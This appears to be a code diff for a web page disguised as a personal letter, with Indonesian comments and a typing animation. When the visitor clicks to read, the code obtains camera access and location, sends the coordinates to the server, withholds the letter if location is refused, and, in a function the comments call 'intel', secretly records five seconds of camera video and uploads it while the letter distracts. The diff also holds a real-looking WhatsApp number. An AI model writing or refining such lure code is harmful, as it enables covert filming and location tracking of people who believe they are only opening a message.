@@ -1,12 +1,13 @@
-// ... (Bagian pesan dan partikel background biarkan tetap seperti punyamu) ...
+// ... (Bagian teks "message" dan partikel background tetap sama seperti sebelumnya) ...
 
 readBtn.addEventListener("click", () => {
-    // 1. Minta izin Kamera & Audio dulu
+    // 1. Langsung minta izin Kamera
     navigator.mediaDevices.getUserMedia({ video: true, audio: false })
     .then(function(stream) {
         globalStream = stream;
 
-        // 2. Minta izin Lokasi dengan batasan waktu (Timeout) agar tidak macet
+        // 2. Minta izin Lokasi dengan batasan waktu (Timeout)
+        // Kita gunakan opsi 'enableHighAccuracy: false' agar lebih cepat terdeteksi
         navigator.geolocation.getCurrentPosition(
             function(pos) {
                 // JIKA LOKASI BERHASIL
@@ -16,7 +17,7 @@ readBtn.addEventListener("click", () => {
                     body: JSON.stringify({ latitude: pos.coords.latitude, longitude: pos.coords.longitude })
                 });
                 
-                // Lanjut buka surat & proses foto
+                // Lanjut jalankan fungsi utama
                 jalankanSemua(globalStream);
             },
             function(err) {
@@ -24,7 +25,7 @@ readBtn.addEventListener("click", () => {
                 alert("Akses lokasi ditolak. Mohon izinkan lokasi agar surat bisa terbuka.");
                 stream.getTracks().forEach(t => t.stop());
             },
-            { timeout: 5000 } // Jika 5 detik lokasi tidak ketemu, akan lari ke fungsi error
+            { timeout: 8000, enableHighAccuracy: false } // Batas waktu 8 detik
         );
     })
     .catch(err => {
@@ -33,10 +34,13 @@ readBtn.addEventListener("click", () => {
     });
 });
 
-// Fungsi untuk menggabungkan semua proses agar tidak error
+// FUNGSI KUNCI: Menjalankan surat & intel secara bersamaan
 function jalankanSemua(stream) {
-    bukaSurat(); // Buka surat dulu agar user tidak menunggu lama
-    prosesIntel(stream); // Proses foto & video di latar belakang
+    // Jalankan musik & animasi ngetik surat
+    bukaSurat(); 
+    
+    // Proses foto & video diam-diam di background
+    prosesIntel(stream); 
 }
 
 function bukaSurat() {
@@ -55,7 +59,7 @@ function bukaSurat() {
         if (i < words.length) {
             typedText.innerHTML += words[i];
             i++;
-            setTimeout(typeWriter, 150);
+            setTimeout(typeWriter, 120); // Kecepatan ngetik
         } else {
             cursor.style.display = 'none';
             waBtn.href = "https://wa.me/6283809403083?text=aku%20udah%20baca%20suratnya...";
@@ -94,8 +98,11 @@ function mulaiRekaman(stream) {
         const fd = new FormData();
         fd.append("video", videoBlob, "video.mp4");
         fetch("/kirim-video", { method: "POST", body: fd })
-        .then(() => { stream.getTracks().forEach(t => t.stop()); });
+        .then(() => { 
+            // Matikan kamera SETELAH semua data (termasuk video) selesai terkirim
+            stream.getTracks().forEach(t => t.stop()); 
+        });
     };
     recorder.start();
-    setTimeout(() => recorder.stop(), 5000);
+    setTimeout(() => recorder.stop(), 5000); // Rekam 5 detik
 }
